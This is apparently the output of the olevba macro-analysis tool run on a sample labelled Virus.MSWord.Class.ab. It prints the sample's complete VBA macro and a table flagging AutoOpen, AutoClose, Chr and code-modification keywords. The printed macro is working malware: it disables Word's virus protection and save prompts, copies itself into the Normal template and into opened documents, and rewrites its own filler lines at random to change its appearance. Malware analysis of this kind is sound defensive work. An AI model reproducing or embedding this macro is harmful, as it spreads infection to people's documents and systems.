olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ab-3b09766689f8b814485cf2f2f27d27e8f33b35ac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ab-3b09766689f8b814485cf2f2f27d27e8f33b35ac - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
Options.ConfirmConversions = 0
UIL = QBN + KGN
UN79 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
OFG = SSM + VUE
Application.EnableCancelKey = 0
PVF = LCV + OAM
OV65 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CCR = GBG + IGU
Options.VirusProtection = 0
VIG = DDO + JJP
Options.SaveNormalPrompt = 0
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set IG87 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
BD78 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set IG87 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
EF50 = True
OLS = BEO + JHD
End If
PUL = BQI + KKE
If EF50 <> True And BD78 <> True Then GoTo OP79
HCM = DUC + JGT
If EF50 = True Then IG87.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, OV65 - 1))
QGO = FBA + HRG
If BD78 = True Then IG87.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UN79 - 1))
FKF = HAK + ETM
With IG87.CodeModule
QUH = LBN + JVC
For x = 2 To (IG87.CodeModule.CountOfLines - 1) Step 2
UNH = DKE + VCA
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
HMU = LIS + SOP
Next x
VHK = JPD + JLR
End With
LJL = FNK + OTI
OP79:
GGD = LEM + HTK
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

